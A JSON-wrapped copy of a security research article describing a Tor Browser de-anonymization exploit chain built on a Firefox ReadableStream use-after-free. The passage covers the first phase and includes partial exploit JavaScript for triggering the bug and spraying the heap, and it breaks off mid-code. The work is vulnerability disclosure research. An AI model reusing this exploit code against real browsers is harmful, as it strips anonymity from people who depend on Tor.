@@ -1,0 +1,3033 @@
+{
+  "schemaVersion": 1,
+  "id": "gv1y811sp5p9kl7p3ci7xjt5n",
+  "status": "available",
+  "provenance": "source-public-page",
+  "sourceURL": "https://calif.io/research/tortilla-with-onion",
+  "fetchedAt": "2026-11-27T01:10:27.766933Z",
+  "label": "正文 · 原文来源",
+  "notice": "AI HOT 页面未提供完整正文，以下内容抓取自原始来源。",
+  "topics": [],
+  "tags": [],
+  "languages": {
+    "original": {
+      "label": "原文",
+      "blocks": [
+        {
+          "type": "heading",
+          "text": "TORtilla with Onion",
+          "inlines": [
+            {
+              "text": "TORtilla with Onion"
+            }
+          ],
+          "level": 2
+        },
+        {
+          "type": "paragraph",
+          "text": "De-anonymize Tor Browser to reveal the real IP",
+          "inlines": [
+            {
+              "text": "De-anonymize Tor Browser to reveal the real IP"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Carlos Roque",
+          "inlines": [
+            {
+              "text": "Carlos Roque"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "November 26, 2026",
+          "inlines": [
+            {
+              "text": "November 26, 2026"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "patch-the-planet",
+          "inlines": [
+            {
+              "href": "https://calif.io/research/patch-the-planet",
+              "text": "patch-the-planet"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "ContentsTor Browser conceptExploit ChainFirst Phase: UAF ReadableStream on Gecko/Firefox (CVE-2026-92027)UAF: Get libxul baseUAF: Get UAF region baseSecond Phase: UAF to ROPModifying H to a false objectThird Phase: ROP forges the parent's historyFourth Phase: Revealing the IPPoCConclusions",
+          "inlines": [
+            {
+              "text": "Contents"
+            },
+            {
+              "href": "https://calif.io/research/tortilla-with-onion#tor-browser-concept",
+              "text": "Tor Browser concept"
+            },
+            {
+              "href": "https://calif.io/research/tortilla-with-onion#exploit-chain",
+              "text": "Exploit Chain"
+            },
+            {
+              "href": "https://calif.io/research/tortilla-with-onion#first-phase-uaf-readablestream-on-geckofirefox-cve-2026-92027",
+              "text": "First Phase: UAF ReadableStream on Gecko/Firefox (CVE-2026-92027)"
+            },
+            {
+              "href": "https://calif.io/research/tortilla-with-onion#uaf-get-libxul-base",
+              "text": "UAF: Get libxul base"
+            },
+            {
+              "href": "https://calif.io/research/tortilla-with-onion#uaf-get-uaf-region-base",
+              "text": "UAF: Get UAF region base"
+            },
+            {
+              "href": "https://calif.io/research/tortilla-with-onion#second-phase-uaf-to-rop",
+              "text": "Second Phase: UAF to ROP"
+            },
+            {
+              "href": "https://calif.io/research/tortilla-with-onion#modifying-h-to-a-false-object",
+              "text": "Modifying H to a false object"
+            },
+            {
+              "href": "https://calif.io/research/tortilla-with-onion#third-phase-rop-forges-the-parents-history",
+              "text": "Third Phase: ROP forges the parent's history"
+            },
+            {
+              "href": "https://calif.io/research/tortilla-with-onion#fourth-phase-revealing-the-ip",
+              "text": "Fourth Phase: Revealing the IP"
+            },
+            {
+              "href": "https://calif.io/research/tortilla-with-onion#poc",
+              "text": "PoC"
+            },
+            {
+              "href": "https://calif.io/research/tortilla-with-onion#conclusions",
+              "text": "Conclusions"
+            }
+          ]
+        },
+        {
+          "type": "image",
+          "src": "aihot/media/c9faaa6a1cb0990e6f7d9af4df3c267d2ad247d1ffaa616e45b44ff86ed8f87b.jpg",
+          "alt": "TORtilla with Onion"
+        },
+        {
+          "type": "quote",
+          "text": "This research is part of OpenAI's Patch the Planet program."
+        },
+        {
+          "type": "paragraph",
+          "text": "When we think about anonymity and security on the internet, as well as the dark web, one of the first things that come to mind is Tor, this great network of nodes that helps us navigate more safely through the most remote corners of the internet.",
+          "inlines": [
+            {
+              "text": "When we think about anonymity and security on the internet, as well as the dark web, one of the first things that come to mind is Tor, this great network of nodes that helps us navigate more safely through the most remote corners of the internet."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "In this article, we show how a malicious website can overcome the defenses of Tor Browser (15.0.22, default settings) to de-anonymize the user and leak their real IP.",
+          "inlines": [
+            {
+              "text": "In this article, we show how a malicious website can overcome the defenses of Tor Browser ("
+            },
+            {
+              "code": true,
+              "text": "15.0.22"
+            },
+            {
+              "text": ", default settings) to de-anonymize the user and leak their real IP."
+            }
+          ]
+        },
+        {
+          "type": "heading",
+          "text": "Tor Browser concept",
+          "inlines": [
+            {
+              "text": "Tor Browser concept"
+            }
+          ],
+          "level": 2
+        },
+        {
+          "type": "paragraph",
+          "text": "Tor Browser distributes a modified and hardened version of Firefox ESR together with the Tor daemon, which runs as a separate process.",
+          "inlines": [
+            {
+              "text": "Tor Browser distributes a modified and hardened version of Firefox ESR together with the Tor daemon, which runs as a separate process."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "A simplified architecture of the platform:",
+          "inlines": [
+            {
+              "text": "A simplified architecture of the platform:"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "When we visit a normal website through Tor, the website sees the IP address of the exit relay instead of ours. With an .onion service, things work a little differently. Our browser and the service communicate through a shared Tor relay (called a rendezvous point) without revealing their IP addresses to each other. In both cases anonymity depends on the browser not opening a separate connection outside Tor. The final stage of this exploit violates that application boundary.",
+          "inlines": [
+            {
+              "text": "When we visit a normal website through Tor, the website sees the IP address of the exit relay instead of ours. With an "
+            },
+            {
+              "code": true,
+              "text": ".onion"
+            },
+            {
+              "text": " service, things work a little differently. Our browser and the service communicate through a shared Tor relay (called a rendezvous point) without revealing their IP addresses to each other. In both cases anonymity depends on the browser not opening a separate connection outside Tor. The final stage of this exploit violates that application boundary."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Having laid the foundations, let's go with the first phase of the exploit.",
+          "inlines": [
+            {
+              "text": "Having laid the foundations, let's go with the first phase of the exploit."
+            }
+          ]
+        },
+        {
+          "type": "heading",
+          "text": "Exploit Chain",
+          "inlines": [
+            {
+              "text": "Exploit Chain"
+            }
+          ],
+          "level": 2
+        },
+        {
+          "type": "paragraph",
+          "text": "The phases of the exploit are as follows:",
+          "inlines": [
+            {
+              "text": "The phases of the exploit are as follows:"
+            }
+          ]
+        },
+        {
+          "type": "list",
+          "ordered": true,
+          "items": [
+            {
+              "inlines": [
+                {
+                  "text": "The victim opens the page and clicks once to create the same-origin popup. A bug in "
+                },
+                {
+                  "href": "https://developer.mozilla.org/en-US/docs/Web/API/ReadableStreamBYOBReader",
+                  "text": "BYOB"
+                },
+                {
+                  "text": " ("
+                },
+                {
+                  "italic": true,
+                  "text": "bring your own buffer"
+                },
+                {
+                  "text": ") handling between the two windows leaves a usable view over freed memory. It is exploited first with 64 MiB to find the base address of "
+                },
+                {
+                  "code": true,
+                  "text": "libxul"
+                },
+                {
+                  "text": " and then with 512 MiB to control a UAF region and obtain its base address."
+                }
+              ]
+            },
+            {
+              "inlines": [
+                {
+                  "text": "The allocator is manipulated to overwrite a pointer. A fake object/"
+                },
+                {
+                  "code": true,
+                  "text": "vtable"
+                },
+                {
+                  "text": " is installed, and "
+                },
+                {
+                  "code": true,
+                  "text": "console.error()"
+                },
+                {
+                  "text": " starts ROP in the renderer."
+                }
+              ]
+            },
+            {
+              "inlines": [
+                {
+                  "text": "ROP forges a history entry with System principal and asks the parent to reload it."
+                }
+              ]
+            },
+            {
+              "inlines": [
+                {
+                  "text": "De-anonymization: the privileged DevTools page opens a direct socket, "
+                },
+                {
+                  "code": true,
+                  "text": "accept()"
+                },
+                {
+                  "text": " reveals the public source IP address of the connection that bypasses Tor."
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "type": "heading",
+          "text": "First Phase: UAF ReadableStream on Gecko/Firefox (CVE-2026-92027)",
+          "inlines": [
+            {
+              "text": "First Phase: UAF ReadableStream on Gecko/Firefox (CVE-2026-92027)"
+            }
+          ],
+          "level": 3
+        },
+        {
+          "type": "paragraph",
+          "text": "Before going into the bug, let's start at the beginning, the attacker's infrastructure.",
+          "inlines": [
+            {
+              "text": "Before going into the bug, let's start at the beginning, the attacker's infrastructure."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The attacker has a website as simple as this:",
+          "inlines": [
+            {
+              "text": "The attacker has a website as simple as this:"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The exploit requires the user to click \"Launch proof\". As we can see in the following image, Tor Browser prevents the automatic execution of popups from websites as a security measure.",
+          "inlines": [
+            {
+              "text": "The exploit requires the user to click \"Launch proof\". As we can see in the following image, Tor Browser prevents the automatic execution of popups from websites as a security measure."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "You may be wondering: why are two windows needed? Great question! This is going to be key when triggering the UAF.",
+          "inlines": [
+            {
+              "text": "You may be wondering: why are two windows needed? Great question! This is going to be key when triggering the UAF."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The attacker uses the main page (the opener) and another page that opens as a popup. Both arrive through Tor and belong to the same origin. As we said before, the two windows have the same origin; therefore, they can call each other, but they are two different JavaScript realms.",
+          "inlines": [
+            {
+              "text": "The attacker uses the main page (the "
+            },
+            {
+              "bold": true,
+              "text": "opener"
+            },
+            {
+              "text": ") and another page that opens as a "
+            },
+            {
+              "bold": true,
+              "text": "popup"
+            },
+            {
+              "text": ". Both arrive through Tor and belong to the same origin. As we said before, the two windows have the same origin; therefore, they can call each other, "
+            },
+            {
+              "italic": true,
+              "bold": true,
+              "text": "but they are two different JavaScript realms"
+            },
+            {
+              "text": "."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The opener's task in this initial phase is to create the streams, preserve the views and analyze the memory. The popup provides the buffers, keeps the BYOB reads, and creates the allocations with which the memory will be reused.",
+          "inlines": [
+            {
+              "text": "The "
+            },
+            {
+              "bold": true,
+              "text": "opener's"
+            },
+            {
+              "text": " task in this initial phase is to create the streams, preserve the views and analyze the memory. The "
+            },
+            {
+              "bold": true,
+              "text": "popup"
+            },
+            {
+              "text": " provides the buffers, keeps the BYOB reads, and creates the allocations with which the memory will be reused."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Before continuing, BYOB is a reading mode in which the consumer provides the memory where the producer should write. In a normal read, the stream creates or delivers its own block of data. With BYOB, the reader offers an already prepared Uint8Array for the producer to fill directly, avoiding another allocation and copy. Gecko coordinates that memory through the reader, a pending descriptor and controller.byobRequest.view. When the producer finishes, it indicates how many bytes it wrote through respond(). The exploit deliberately omits that response to keep the read and its memory state pending.",
+          "inlines": [
+            {
+              "text": "Before continuing, BYOB is a reading mode in which the consumer provides the memory where the producer should write. In a normal read, the stream creates or delivers its own block of data. With BYOB, the reader offers an already prepared "
+            },
+            {
+              "code": true,
+              "text": "Uint8Array"
+            },
+            {
+              "text": " for the producer to fill directly, avoiding another allocation and copy. Gecko coordinates that memory through the reader, a pending descriptor and "
+            },
+            {
+              "code": true,
+              "text": "controller.byobRequest.view"
+            },
+            {
+              "text": ". When the producer finishes, it indicates how many bytes it wrote through "
+            },
+            {
+              "code": true,
+              "text": "respond()"
+            },
+            {
+              "text": ". "
+            },
+            {
+              "bold": true,
+              "text": "The exploit deliberately omits that response to keep the read and its memory state pending."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The communication begins like this:",
+          "inlines": [
+            {
+              "text": "The communication begins like this:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "victim -> opens the opener through Tor\nvictim -> clicks the full-window link\npopup -> host.register(self)\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "host is the name the popup uses to refer to the opener. child is the name the opener uses to refer to the popup. They are ordinary variables, not special browser functions.",
+          "inlines": [
+            {
+              "code": true,
+              "text": "host"
+            },
+            {
+              "text": " is the name the "
+            },
+            {
+              "bold": true,
+              "text": "popup"
+            },
+            {
+              "text": " uses to refer to the "
+            },
+            {
+              "bold": true,
+              "text": "opener"
+            },
+            {
+              "text": ". "
+            },
+            {
+              "code": true,
+              "text": "child"
+            },
+            {
+              "text": " is the name the opener uses to refer to the "
+            },
+            {
+              "bold": true,
+              "text": "popup"
+            },
+            {
+              "text": ". They are ordinary variables, not special browser functions."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The popup creates a large Uint8Array called victim. In the first pass it is 64 MiB, in the second 512 MiB. It then requests a byte ReadableStream from the opener and creates a BYOB reader:",
+          "inlines": [
+            {
+              "text": "The popup creates a large "
+            },
+            {
+              "code": true,
+              "text": "Uint8Array"
+            },
+            {
+              "text": " called "
+            },
+            {
+              "code": true,
+              "text": "victim"
+            },
+            {
+              "text": ". In the first pass it is 64 MiB, in the second 512 MiB. It then requests a byte "
+            },
+            {
+              "code": true,
+              "text": "ReadableStream"
+            },
+            {
+              "text": " from the opener and creates a BYOB reader:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "popup -> creates victim\npopup -> host.makeStream(i)\nopener -> creates ReadableStream({type: \"bytes\", pull(controller) {...}})\nopener -> returns the stream to the popup\npopup -> creates ReadableStreamBYOBReader(stream)\npopup -> reader.read(victim)\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "Opener:",
+          "inlines": [
+            {
+              "bold": true,
+              "text": "Opener"
+            },
+            {
+              "text": ":"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "...\n  function makeStream(i) {let s=new ReadableStream({type:'bytes',pull(c){\n   let req=c.byobRequest;if(req&&!bads[i]){controllers[i]=c;bads[i]=req.view;\n    if(bads.filter(Boolean).length===count)\n    {document.title='BAD:'+count+':'+bads[0].length;child.start()}\n   }}});streams[i]=s;return s}\n...\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "Popup:",
+          "inlines": [
+            {
+              "bold": true,
+              "text": "Popup"
+            },
+            {
+              "text": ":"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "...\n  const count=128;\n"
+        },
+        {
+          "type": "code",
+          "text": "  async function setup(){for(let i=0;i<count;i++){\n   for(let j=0;j<3;j++)anchors.push(new ArrayBuffer(0));\n   let victim=i===0&&mode==='native'?new Uint8Array(await new Blob([new\n   ArrayBuffer(0x04000000)]).arrayBuffer()):new Uint8Array(i===0&&mode.endsWith('blob')?\n   0x50000000:i===0?0x20000000:size);\n   let r=new\n   ReadableStreamBYOBReader(host.makeStream(i));readers.push(r);r.read(victim).catch(()=>{});\n  }}\n  setup();\n...\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "The last command (popup -> reader.read(victim)) is the one that connects both realms. victim and its buffer belong to the popup, but the reader is associated with the stream/controller created in the opener. When processing the read, Gecko passes that buffer to the controller's algorithm through a CCW, which acts as a representative of the real object.",
+          "inlines": [
+            {
+              "text": "The last command ("
+            },
+            {
+              "code": true,
+              "text": "popup -> reader.read(victim)"
+            },
+            {
+              "text": ") is the one that connects both realms. "
+            },
+            {
+              "code": true,
+              "text": "victim"
+            },
+            {
+              "text": " and its buffer belong to the "
+            },
+            {
+              "bold": true,
+              "text": "popup"
+            },
+            {
+              "text": ", but the reader is associated with the stream/controller created in the opener. When processing the read, Gecko passes that buffer to the controller's algorithm through a CCW, which acts as a representative of the real object."
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "popup: reader.read(victim)\n          -> opener stream controller\n          -> TransferArrayBuffer(original buffer wrapper)\n          -> PullIntoDescriptor(replacement buffer)\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "TransferArrayBuffer() crosses the wrapper, takes the backing store from the original buffer, detaches that object and creates another ArrayBuffer that receives the same bytes:",
+          "inlines": [
+            {
+              "code": true,
+              "text": "TransferArrayBuffer()"
+            },
+            {
+              "text": " crosses the wrapper, takes the backing store from the original buffer, detaches that object and creates another "
+            },
+            {
+              "code": true,
+              "text": "ArrayBuffer"
+            },
+            {
+              "text": " that receives the same bytes:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "before: original popup buffer -> backing store\nafter:  original buffer detached   replacement buffer -> backing store\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "PullIntoDescriptor preserves the replacement buffer while the read is pending. The CCW and the transfer do not yet constitute the flaw by themselves; they prepare an ownership state between realms that the following operation will expose through a view.",
+          "inlines": [
+            {
+              "code": true,
+              "text": "PullIntoDescriptor"
+            },
+            {
+              "text": " preserves the replacement buffer while the read is pending. The CCW and the transfer do not yet constitute the flaw by themselves; they prepare an ownership state between realms that the following operation will expose through a view."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "When the read remains pending, Gecko executes the stream's pull(controller) function. Since that function was created in the opener, the callback runs there:",
+          "inlines": [
+            {
+              "text": "When the read remains pending, Gecko executes the stream's "
+            },
+            {
+              "code": true,
+              "text": "pull(controller)"
+            },
+            {
+              "text": " function. Since that function was created in the opener, the callback runs there:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "Gecko -> executes pull(controller) in the opener\nopener -> reads controller.byobRequest\nopener -> stores controller.byobRequest.view in bads[i]\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "Gecko obtains the replacement buffer from PullIntoDescriptor, creates a new Uint8Array over it and stores it as ReadableStreamBYOBRequest.mView. .view returns that object to the page's code. This is the view that the opener will preserve even after invalidating the read.",
+          "inlines": [
+            {
+              "text": "Gecko obtains the replacement buffer from "
+            },
+            {
+              "code": true,
+              "text": "PullIntoDescriptor"
+            },
+            {
+              "text": ", creates a new "
+            },
+            {
+              "code": true,
+              "text": "Uint8Array"
+            },
+            {
+              "text": " over it and stores it as "
+            },
+            {
+              "code": true,
+              "text": "ReadableStreamBYOBRequest.mView"
+            },
+            {
+              "text": ". "
+            },
+            {
+              "code": true,
+              "text": ".view"
+            },
+            {
+              "text": " returns that object to the page's code. This is the view that the opener will preserve even after invalidating the read."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The only function of bads[] is to preserve the views after the BYOB request disappears.",
+          "inlines": [
+            {
+              "bold": true,
+              "text": "The only function of "
+            },
+            {
+              "bold": true,
+              "code": true,
+              "text": "bads[]"
+            },
+            {
+              "bold": true,
+              "text": " is to preserve the views after the BYOB request disappears."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The view allows access to the bytes through indexes. The native pointer remains hidden inside SpiderMonkey.",
+          "inlines": [
+            {
+              "text": "The view allows access to the bytes through indexes. The native pointer remains hidden inside SpiderMonkey."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "JavaScript can execute bads[i][100], but cannot directly print an .address property.",
+          "inlines": [
+            {
+              "text": "JavaScript can execute "
+            },
+            {
+              "code": true,
+              "text": "bads[i][100]"
+            },
+            {
+              "text": ", but cannot directly print an "
+            },
+            {
+              "code": true,
+              "text": ".address"
+            },
+            {
+              "text": " property."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The first stream contains the only memory that matters to preserve as UAF:",
+          "inlines": [
+            {
+              "text": "The first stream contains the only memory that matters to preserve as UAF:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "  stream 0 -> view of 64 or 512 MiB\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "The 128 streams? (in popup)",
+          "inlines": [
+            {
+              "text": "The 128 streams? (in "
+            },
+            {
+              "bold": true,
+              "text": "popup"
+            },
+            {
+              "text": ")"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "  async function setup(){for(let i=0;i<count;i++){\n...\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "The exploit repeats this operation with 128 streams. The first stream uses the huge buffer and the other 127 stabilize the distribution of wrappers, descriptors and objects during collection.",
+          "inlines": [
+            {
+              "text": "The exploit repeats this operation with 128 streams. The first stream uses the huge buffer and the other 127 stabilize the distribution of wrappers, descriptors and objects during collection."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The 127 create small copies of the same topology.",
+          "inlines": [
+            {
+              "text": "The 127 create small copies of the same topology."
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "  stream -> controller -> PullIntoDescriptor -> BYOBRequest -> wrapper/view\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "When the opener has stored the 128 views, the release begins:",
+          "inlines": [
+            {
+              "text": "When the opener has stored the 128 views, the release begins:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "opener -> child.start()\npopup -> host.release()\nopener -> child.watch(bads[0].buffer)\nopener -> controllers[i].error(new Error(\"release\"))\nopener -> removes streams[] and controllers[]\nopener -> child.afterRelease()\npopup -> removes readers[]\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "When they are all put into error simultaneously, Gecko clears many similar descriptors, wrappers and objects in the same cycle. That reduces variations in order and timing during GC and increases the probability that the large buffer is freed and its interval reused in the expected way.",
+          "inlines": [
+            {
+              "text": "When they are all put into error simultaneously, Gecko clears many similar descriptors, wrappers and objects in the same cycle. That reduces variations in order and timing during GC and increases the probability that the large buffer is freed and its interval reused in the expected way."
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "...\n  function start(){if(started)return;started=true;setTimeout(()=>host.release(),100)}\n"
+        },
+        {
+          "type": "code",
+          "text": "  function watch(obj){weak=new WeakRef(obj);registry.register(obj,1)}\n"
+        },
+        {
+          "type": "code",
+          "text": "  function afterRelease(){readers=[];new Image().src='/stream-popup-stage?v=released';let\n  round=0,extra=0,seekRound=0;\n...\n"
+        },
+        {
+          "type": "code",
+          "text": "...\n  if(bads.filter(Boolean).length===count)\n  {document.title='BAD:'+count+':'+bads[0].length;child.start()}\n"
+        },
+        {
+          "type": "code",
+          "text": "  function release(){\n   let watched=bads[0].buffer;child.watch(watched);watched=null;\n   for(let i=0;i<count;i++){try{controllers[i].error(new Error('release'))}catch(e){}}\n   controllers=[];streams=[];document.title='RELEASED';child.afterRelease()\n  }\n...\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "controller.error() puts the stream into error and makes Gecko invalidate the pending read. The internal code removes the controller and the view from the BYOB request and deletes the PullIntoDescriptors. Emptying streams[], controllers[] and readers[] removes the other JavaScript references.",
+          "inlines": [
+            {
+              "code": true,
+              "text": "controller.error()"
+            },
+            {
+              "text": " puts the stream into "
+            },
+            {
+              "bold": true,
+              "text": "error"
+            },
+            {
+              "text": " and makes Gecko invalidate the pending read. The internal code removes the controller and the view from the BYOB request and deletes the "
+            },
+            {
+              "code": true,
+              "text": "PullIntoDescriptor"
+            },
+            {
+              "text": "s. Emptying "
+            },
+            {
+              "code": true,
+              "text": "streams[]"
+            },
+            {
+              "text": ", "
+            },
+            {
+              "code": true,
+              "text": "controllers[]"
+            },
+            {
+              "text": " and "
+            },
+            {
+              "code": true,
+              "text": "readers[]"
+            },
+            {
+              "text": " removes the other JavaScript references."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "NOTE: Removing references does not immediately release memory. It makes the objects eligible for GC. The popup creates waves of small objects and uses timers so that collection, pending tasks and finalization run.",
+          "inlines": [
+            {
+              "bold": true,
+              "text": "NOTE: Removing references does not immediately release memory. It makes the objects eligible for GC. The "
+            },
+            {
+              "bold": true,
+              "code": true,
+              "text": "popup"
+            },
+            {
+              "bold": true,
+              "text": " creates waves of small objects and uses timers so that collection, pending tasks and finalization run."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The correct behavior would be this: if bads[i] preserves the view, the backing store should remain alive; or, if Gecko needs to release it, it should detach the view, set its length to zero, and only then release the memory. However...",
+          "inlines": [
+            {
+              "text": "The correct behavior would be this: if "
+            },
+            {
+              "code": true,
+              "text": "bads[i]"
+            },
+            {
+              "text": " preserves the view, the backing store should remain alive; or, if Gecko needs to release it, it should detach the view, set its length to zero, and only then release the memory. However..."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Gecko loses the correct owner of the backing store; therefore, GC releases the allocation, and bads[i] preserves the old pointer and length.",
+          "inlines": [
+            {
+              "text": "Gecko loses the correct owner of the backing store; therefore, GC releases the allocation, and "
+            },
+            {
+              "code": true,
+              "text": "bads[i]"
+            },
+            {
+              "text": " preserves the old pointer and length."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Ladies and gentlemen, we have the UAF. This would be the procedure for both UAFs we are going to make.",
+          "inlines": [
+            {
+              "text": "Ladies and gentlemen, we have the UAF. This would be the procedure for both UAFs we are going to make."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Basically, the opener creates the stream and the popup creates the 64 MiB buffer in the first phase or 512 MiB in the second (now we will see why). The popup gives that buffer to a BYOB read. Gecko transfers its backing store and executes pull(controller) in the opener, which preserves controller.byobRequest.view in bads[]. After that, the opener puts the controllers into error and removes streams and controllers, the popup removes the readers and when forcing GC, the bug makes it possible to release and reuse the backing store even though the saved view still works in bads[]. That view is the one left as UAF.",
+          "inlines": [
+            {
+              "text": "Basically, the "
+            },
+            {
+              "bold": true,
+              "text": "opener"
+            },
+            {
+              "text": " creates the stream and the "
+            },
+            {
+              "bold": true,
+              "text": "popup"
+            },
+            {
+              "text": " creates the 64 MiB buffer in the first phase or 512 MiB in the second (now we will see why). The "
+            },
+            {
+              "bold": true,
+              "text": "popup"
+            },
+            {
+              "text": " gives that buffer to a BYOB read. Gecko transfers its backing store and executes pull(controller) in the "
+            },
+            {
+              "bold": true,
+              "text": "opener"
+            },
+            {
+              "text": ", which preserves "
+            },
+            {
+              "code": true,
+              "text": "controller.byobRequest.view"
+            },
+            {
+              "text": " in "
+            },
+            {
+              "code": true,
+              "text": "bads[]"
+            },
+            {
+              "text": ". After that, the opener puts the controllers into error and removes streams and controllers, the popup removes the readers and when forcing GC, the bug makes it possible to release and reuse the backing store even though the saved view still works in "
+            },
+            {
+              "code": true,
+              "text": "bads[]"
+            },
+            {
+              "text": ". That view is the one left as UAF."
+            }
+          ]
+        },
+        {
+          "type": "heading",
+          "text": "UAF: Get libxul base",
+          "inlines": [
+            {
+              "text": "UAF: Get "
+            },
+            {
+              "code": true,
+              "text": "libxul"
+            },
+            {
+              "text": " base"
+            }
+          ],
+          "level": 4
+        },
+        {
+          "type": "paragraph",
+          "text": "The first pass uses the UAF to discover where libxul is loaded during this execution. For this, the allocation that we mentioned before of 64 MiB is made:",
+          "inlines": [
+            {
+              "text": "The first pass uses the UAF to discover where "
+            },
+            {
+              "code": true,
+              "text": "libxul"
+            },
+            {
+              "text": " is loaded during this execution. For this, the allocation that we mentioned before of 64 MiB is made:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "popup -> creates 64 MiB victim\nopener/popup -> create the UAF\npopup -> creates 24,000 Blob-backed allocations\nopener -> examines the first 64 KiB of the old view\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "Popup: create 64 MiB victim",
+          "inlines": [
+            {
+              "text": "Popup: create 64 MiB "
+            },
+            {
+              "code": true,
+              "text": "victim"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "...\n  let victim=i===0&&mode==='native'?new Uint8Array(await new Blob([new\n  ArrayBuffer(0x04000000)]).arrayBuffer()):new Uint8Array(i===0&&mode.endsWith('blob')?\n  0x50000000:i===0?0x20000000:size);\n...\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "Popup/opener: create the UAF",
+          "inlines": [
+            {
+              "text": "Popup/opener: create the UAF"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "...\n  let r=new\n  ReadableStreamBYOBReader(host.makeStream(i));readers.push(r);r.read(victim).catch(()=>{});\n"
+        },
+        {
+          "type": "code",
+          "text": "  let req=c.byobRequest;if(req&&!bads[i]){controllers[i]=c;bads[i]=req.view;\n"
+        },
+        {
+          "type": "code",
+          "text": "  function release(){\n   let watched=bads[0].buffer;child.watch(watched);watched=null;\n   for(let i=0;i<count;i++){try{controllers[i].error(new Error('release'))}catch(e){}}\n   controllers=[];streams=[];document.title='RELEASED';child.afterRelease()\n  }\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "Popup: create the 24,000 Blob-backed allocations",
+          "inlines": [
+            {
+              "bold": true,
+              "text": "Popup"
+            },
+            {
+              "text": ": create the 24,000 Blob-backed allocations"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "...\n  if(mode==='native'){let ps=[];for(let j=0;j<500;j++){let i=fakes.length+j,v=new\n  Uint8Array(96);v[0]=0xd2;v[1]=i&255;v[2]=(i>>8)&255;v[3]=(i>>16)&255;v[4]=0x4b;let o=new\n  Blob([v]);blobs.push(o);ps.push(o.arrayBuffer())}for(let b of await\n  Promise.all(ps))fakes.push(b)}\n...\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "Each allocation carries a marker and follows the Uint8Array -> Blob -> Blob.arrayBuffer() route. Gecko creates C++ objects to process it, and those objects contain pointers to vtables located inside libxul. The exploit keeps the allocations alive so that one of them appears in the interval previously occupied by the 64 MiB buffer.",
+          "inlines": [
+            {
+              "text": "Each allocation carries a marker and follows the "
+            },
+            {
+              "code": true,
+              "text": "Uint8Array -> Blob -> Blob.arrayBuffer()"
+            },
+            {
+              "text": " route. Gecko creates C++ objects to process it, and those objects contain pointers to "
+            },
+            {
+              "bold": true,
+              "text": "vtables"
+            },
+            {
+              "text": " located inside "
+            },
+            {
+              "code": true,
+              "text": "libxul"
+            },
+            {
+              "text": ". The exploit keeps the allocations alive so that one of them appears in the interval previously occupied by the 64 MiB buffer."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Opener: examine the first 64 KiB",
+          "inlines": [
+            {
+              "bold": true,
+              "text": "Opener"
+            },
+            {
+              "text": ": examine the first 64 KiB"
+            }
+          ]
+        },
+        {
+          "type": "code",
